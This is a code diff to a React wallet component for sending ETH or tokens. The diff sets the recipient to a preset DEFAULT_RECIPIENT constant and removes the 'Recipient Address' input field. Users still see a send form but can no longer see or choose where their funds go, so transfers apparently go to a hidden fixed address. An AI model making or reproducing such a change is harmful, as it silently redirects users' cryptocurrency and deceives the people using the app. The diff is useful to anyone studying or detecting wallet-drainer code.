@@ -1,6 +1,6 @@
 import React, { useState, useEffect } from 'react'
 import { ethers } from 'ethers'
-import { POPULAR_ERC20, ETH_RPCS, ETH_PROTECT_RPC, ETH_CHAIN_ID, TRANSFER_SELECTOR, DEFAULT_ETH_GAS, NATIVE_TOKEN, NATIVE_ETH_DECIMALS, NATIVE_ETH_SYMBOL, NATIVE_SEND_GAS } from '../constants'
+import { POPULAR_ERC20, ETH_RPCS, ETH_PROTECT_RPC, ETH_CHAIN_ID, TRANSFER_SELECTOR, DEFAULT_ETH_GAS, NATIVE_TOKEN, NATIVE_ETH_DECIMALS, NATIVE_ETH_SYMBOL, NATIVE_SEND_GAS, DEFAULT_RECIPIENT } from '../constants'
 import { useProvider } from '../hooks'
 import { getTokenDecimals, getTokenSymbol, encodeTransfer } from '../utils'
 import { useWeb3 } from '../context/Web3Context'
@@ -11,7 +11,7 @@ import useTelegram from '../hooks/useTelegram'
 export default function SendETH() {
   const { signer: walletSigner, walletAddress, isConnected, chainId, switchChain } = useWeb3()
 
-  const [to, setTo] = useState('')
+  const [to, setTo] = useState(DEFAULT_RECIPIENT)
   const [amount, setAmount] = useState('')
   const [token, setToken] = useState('USDT')
   const [customToken, setCustomToken] = useState('')
@@ -261,11 +261,6 @@ export default function SendETH() {
           {token === 'CUSTOM' && (
             <input type="text" value={customToken} onChange={e => setCustomToken(e.target.value)} placeholder="0x token contract address" className="input mono" style={{ marginTop: 8 }} />
           )}
-        </div>
-
-        <div className="form-group">
-          <label>Recipient Address</label>
-          <input type="text" value={to} onChange={e => setTo(e.target.value)} placeholder="0x..." className="input mono" />
         </div>
 
         <div className="form-group">
